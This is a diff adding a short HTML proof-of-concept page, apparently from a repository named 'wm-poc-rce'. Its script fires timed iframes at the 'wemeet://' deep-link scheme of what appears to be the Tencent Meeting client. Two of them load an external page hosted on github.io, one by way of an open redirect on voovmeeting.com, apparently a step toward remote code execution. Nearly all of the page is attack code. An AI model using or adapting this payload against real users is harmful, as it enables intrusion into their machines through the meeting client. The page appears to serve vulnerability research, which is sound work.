@@ -1,0 +1,20 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P59</title></head>
+<body><h1>P59</h1>
+<script>
+document.title='P59-START';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+var ideaPage='https://gitwhs.github.io/wm-poc-rce/p59idea.html';
+var viaMp='https://voovmeeting.com/v2/launch-mp?redirect='+encodeURIComponent(ideaPage);
+function frame(src,label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame('wemeet://page/web_app?url='+encodeURIComponent(official),'P59-TB'); }, 500);
+setTimeout(function(){ frame('wemeet://page/meeting_idea?url='+encodeURIComponent(ideaPage),'P59-IDEA-DIRECT'); }, 4000);
+setTimeout(function(){ frame('wemeet://page/meeting_idea?url='+encodeURIComponent(viaMp),'P59-IDEA-MP'); }, 8000);
+setTimeout(function(){ document.title='P59-DONE'; }, 20000);
+</script>
+</body></html>
